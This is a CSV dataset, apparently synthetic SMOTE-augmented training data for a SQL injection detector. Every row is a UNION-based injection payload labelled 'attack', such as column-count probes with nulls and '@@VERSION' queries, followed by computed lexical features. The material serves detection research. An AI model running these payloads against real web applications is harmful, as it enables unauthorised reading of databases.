id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000402,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,0.6943995281885565,74.0,21.483877204203004,3.712890595306436,14.000000000000002,42.96775440840601,5.032245591593994,12.0,0.18918918918918917,0.5806453298433245,0.06800331880532426,0.16216216216216217,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2580613978984987,0.0,0.0,8.741938602101502,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.2580613978984987,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.43149572121236907,70.82397171844376,15.823971718443754,3.103135849136531,50.0,1.0,8.0,11.823971718443754,0.7059962603778294,0.014119925207556588,0.11295940166045272,0.16692441275416126,0.8239717184437535,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,2.0,0.8239717184437534,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000404,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,0.3944153144390486,70.52834559226466,21.735827203867668,3.5989826101126265,14.000000000000002,40.528345592264664,4.0,12.0,0.19857203893982525,0.5744884879860888,0.056734868268521504,0.17020460480556449,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8679136019338344,0.0,8.132086398066166,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000405,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.9381807716624264,57.6190853139935,20.0,3.751030643496559,14.000000000000002,20.0,15.079390209329002,8.539695104664501,0.24347143018551007,0.347816328836443,0.26088094969081654,0.1478312912872304,0.0,0.2698475523322504,3.0,0.0,0.0,0.0,0.0,2.2698475523322506,0.0,0.0,3.0,3.0,0.0,0.26984755233225044,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,2.0647569410264666,77.71236743063406,29.830106055492752,4.209525022144201,40.0,3.0,20.25484091676087,14.457526513873187,0.5152508837957729,0.03864381628468297,0.2596671370727144,0.1864381628468297,3.0,0.0,2.0,0.0,1.4575265138731883,1.0,0.0,1.0849469722536236,0.0,0.0,1.0000000000000004,5.915053027746376,1.0,0.0,1.0,0.0,0.0,1.0,0.5424734861268119,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000407,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,0.8607119298553169,65.88265361334359,21.0,3.6701480634845733,14.000000000000002,24.612245781349742,15.693877109325129,11.576530722668718,0.21280178557730853,0.371829694668105,0.23968872382056455,0.1756797959340219,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.4234692773312823,1.0,0.0,4.1530614453374355,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.45863316055072945,65.90028348060248,20.0,3.7533969155540357,14.000000000000002,26.24045356896397,14.879773215518012,10.780056696120496,0.21266153858246636,0.3969432960191903,0.22685142915533751,0.16354373624300578,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.219943303879503,0.0,0.0,4.560113392240994,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,0.06059890074872647,59.29282254993616,21.05856450998723,3.860535218684281,14.000000000000002,28.234258039948934,8.0,9.058564509987233,0.23620245876612653,0.4760651994064551,0.13497283358064371,0.1527595082467747,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.058564509987233,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000410,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000040,0.24663965956168857,69.1903587905392,25.073603746314618,3.8384184102496754,31.969547551595344,9.8096412094608,21.411170029483053,6.0,0.46043256380723496,0.14405851223908067,0.3086184040367921,0.0868905199168922,0.0,1.0,0.07360374631461819,0.0,0.0,1.0,0.0,1.9263962536853816,0.0,0.0,1.0000000000000004,1.0736037463146182,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000411,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,0.2551975401462016,79.30603275756027,33.28592356569271,4.224536446837004,40.0,2.204021838373512,23.306032757560267,13.795978161626488,0.5044394395951821,0.027710043179436095,0.2937847845667451,0.17406573265863673,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.102010919186756,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000412,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,0.04906476622915579,61.92589920672721,16.0,3.1462924995605275,45.95059947115148,1.0,4.0,10.975299735575737,0.7420350817113881,0.01615037465244032,0.06460149860976128,0.17721304502641025,1.0,0.0,1.9752997355757373,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.987649867787869,1.9752997355757373,1.0,0.0,0.9876498677878687,0.01235013221213127,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.4803522024526992,74.45841393570599,31.729206967852996,4.380046252259625,44.0,1.9999999999999982,17.0,11.458413935705993,0.5910191391468377,0.02686450632485629,0.22834830376127818,0.15376805076702788,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,6.458413935705994,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000414,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.07267355032130329,66.88295737762968,20.0,3.78283583858604,14.000000000000002,27.843943170172913,14.078028414913543,10.960985792543228,0.20935615285372752,0.41615399702176514,0.21063530719657247,0.16385454292793486,0.0,0.9804928962716143,3.0,0.0,0.0,0.0,0.0,2.019507103728386,0.0,0.0,4.960985792543228,3.0,0.0,0.9804928962716144,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.508727794699824,72.80095788554671,16.0,3.11610533820081,50.0,1.0,9.543678187611464,12.257279697935244,0.687965349534609,0.013759306990692194,0.12986520192055623,0.1684101415541426,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.257279697935244,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,0.05576651067315163,63.26528230029072,21.026528230029072,3.830232893890556,14.000000000000002,24.10611292011629,14.106112920116287,11.053056460058144,0.22141466575253965,0.38102160007835373,0.22286826739796825,0.1746954667711383,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0265282300290717,1.0,0.0,4.026528230029072,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000417,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,0.8852783217691135,67.21128499455642,21.421128499455644,3.8135452066505935,14.000000000000002,25.68451399782257,15.68451399782257,11.842256998911285,0.20940248099069583,0.3820512159150832,0.23247801520744332,0.1760682878867776,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.4211284994556426,1.0,0.0,4.421128499455643,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.6025610326999512,73.45206183305652,31.095876333886956,4.285828434959278,43.397250889257975,1.9999999999999982,18.05481094379855,10.0,0.5912236110781083,0.02723429638318081,0.245370610622807,0.1361714819159039,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.3013745553710139,0.0,0.0,1.0000000000000004,4.849312722314493,0.0,0.0,1.0,0.0,0.0,1.0,0.15068727768550694,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000419,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.40074586230158094,62.14250129577526,14.0,2.983779786780479,47.71400103662022,1.0,4.0,9.428500259155053,0.7676869053789406,0.01615654731052968,0.06462618924211878,0.1515303580684109,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.428500259155053,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,1.3131817149005667,61.46172371991225,22.55771546498903,3.8803794908117735,14.000000000000002,26.69258557986837,10.653707210065814,10.115430929978062,0.22875462022165413,0.4297551696772611,0.1772731926842051,0.16421701741687972,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.442284535010969,1.0,0.0,4.673146394967093,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.8888307907391713,74.99401650185298,26.33200366707844,4.121871822865146,31.671985331686244,18.990027503088296,15.0,9.332003667078439,0.4267165323890358,0.2484886193230055,0.20068557273731055,0.12410927555064817,3.0,0.0,0.6660018335392198,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.66600183353922,2.6660018335392195,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,0.11047422186332488,69.81431006476218,21.96286201295244,3.623914530287635,14.000000000000002,39.702896103619494,4.148551948190249,11.962862012952437,0.20057135364688558,0.5684901812445884,0.059591515629509595,0.17134694947901635,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.037137987047562326,1.0,0.0,7.925724025904875,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.037137987047562326,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.4093765621025396,67.32883428880191,19.0,3.6693774040682055,14.000000000000002,38.5675722475445,4.0,10.761262041257417,0.20906358892141588,0.5712803988217375,0.059732453977547395,0.15992355827929924,0.1193689793712917,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.641893061886126,3.0,0.1193689793712917,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.8763500440632849,72.26454203779697,15.264542037796966,3.1114121155690384,44.941831848812136,1.0,15.058168151187866,11.264542037796966,0.6220781886179249,0.01383855745095186,0.20823525843918736,0.15584799549193587,0.0,0.2645420377969663,2.0,0.0,0.0,0.0,0.0,2.264542037796966,0.0,0.0,6.735457962203034,2.0,0.0,0.2645420377969663,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.33940977436031367,77.77865808293633,22.355731616587267,3.805156023760942,14.000000000000002,37.42292646634906,14.0,12.355731616587265,0.18016549493809147,0.480849694681095,0.1801654949380915,0.15881931544272193,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.355731616587265,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.10891160287388142,76.38554188227256,21.845783247090974,3.7703331458425406,14.000000000000002,36.30843350581805,14.0,12.077108376454513,0.183333725413935,0.47523740069531506,0.18333372541393503,0.15809514847681483,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.077108376454513,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000068,1.3185898171108836,65.28753894775845,16.0,3.194678866743648,39.549977744138026,1.0,14.125055639654931,10.612505563965493,0.6090819688010041,0.015359802568042757,0.21295276818632675,0.16260546044462645,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.2250111279309865,0.0,0.0,5.3874944360345065,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000021,1.4242484766250951,76.57798583322723,30.737611333418215,4.298991905492612,40.0,3.0,18.89358299987268,14.684402833354554,0.522813427778485,0.03921100708338637,0.24586549430426466,0.19211007083386383,3.0,0.0,2.0,0.0,1.6844028333545533,1.0,0.0,0.6311943332908933,0.0,0.0,1.0000000000000004,6.368805666709107,1.0,0.0,1.0,0.0,0.0,1.0,0.3155971666454467,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.283272926226336,76.11360214781553,26.113602147815527,3.8541461181700063,40.88639785218447,3.113602147815529,23.886397852184473,8.227204295631058,0.5372024177555679,0.04089079917814997,0.31384822030390414,0.10805856276237802,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.113602147815529,0.0,0.0,1.0,0.11360214781552924,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000430,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,0.2661699308457144,70.49462990620002,30.421011502384623,4.290414674193713,24.305213802861545,23.536809201907698,15.768404600953849,6.884202300476924,0.34430547225777564,0.3339875576244241,0.22396682033179774,0.09774014978600246,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.8842023004769244,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000431,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,1.092712937029523,65.49316147244272,20.37670963188932,3.803281614513446,14.000000000000002,26.49316147244273,14.0,11.0,0.21395302994214682,0.4039879880183052,0.21395302994214682,0.1681059520974011,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.3767096318893184,0.0,4.623290368110681,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,0.8538053965670289,62.257688214329214,20.257688214329214,3.686823493915607,14.000000000000002,21.030752857316852,16.969247142683148,10.257688214329214,0.22488283794147235,0.3376223535245931,0.27277392088797475,0.16472088764595982,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.742311785670787,0.2576882143292132,0.0,3.2576882143292134,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.03922939991764731,80.04952011646647,27.975239941766766,4.025507471646196,40.0,3.0247600582332357,23.074280174699705,13.95047988353353,0.49969804807032636,0.0377793055349481,0.2882322334294585,0.17429041296526704,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,1.0348887957834416,59.40799709259917,16.26215362250763,3.2693078784990126,39.048614490030516,1.0,9.57292173504577,9.786460867522885,0.6602532406632868,0.01697515603193603,0.15859721543006464,0.1641743878747125,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.2621536225076284,0.26215362250762825,0.0,5.262153622507628,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
